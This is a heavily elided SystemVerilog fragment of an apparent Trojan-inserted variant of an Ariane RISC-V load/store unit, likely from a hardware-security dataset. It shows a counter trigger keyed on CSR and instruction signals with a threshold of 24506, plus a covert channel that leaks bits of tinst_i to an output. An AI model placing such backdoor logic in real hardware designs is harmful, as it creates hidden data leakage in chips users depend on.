...
module load_store_unit_trojan_Covert
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=24506)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24506;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |tinst_i) trojan_counter <= trojan_counter + 1;
    ...
    assign covert_current_bit = tinst_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
